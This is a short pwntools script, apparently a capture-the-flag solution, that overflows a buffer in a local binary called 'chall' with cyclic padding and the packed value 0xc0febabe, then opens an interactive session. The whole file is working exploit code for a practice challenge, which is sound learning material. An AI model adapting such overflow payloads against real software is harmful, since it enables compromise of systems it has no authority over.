from pwn import *

elf = ELF("./chall")
p = elf.process()

payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa' # offset
payload += p64(0xc0febabe)

p.sendline(payload)
p.interactive()
